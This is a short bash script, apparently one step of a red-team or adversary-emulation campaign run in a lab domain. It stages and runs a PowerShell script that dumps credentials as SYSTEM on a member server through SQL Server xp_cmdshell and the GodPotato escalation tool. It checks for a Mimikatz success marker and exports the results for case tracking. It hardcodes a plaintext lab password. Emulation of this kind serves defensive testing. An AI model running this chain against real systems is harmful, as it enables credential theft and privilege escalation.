#!/usr/bin/env bash
# T035 — Credential dump as SYSTEM on mbr01 via SQL xp_cmdshell + GodPotato
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T035-MBR01-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T035 | ${CASE_ID} | T0=${T0} ==="

campaign_stage_file campaign-a-t043-system-exec.ps1
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t035-mbr01-creds.ps1 child.cadre.local \
  "-Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools'")"
printf '%s\n' "${OUT}"
campaign_require_ok T035-CREDS "${OUT}" 'T035_CREDS_OK|MIMI_OK'

cadre_export "${CASE_ID}" T035 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T035 complete ==="
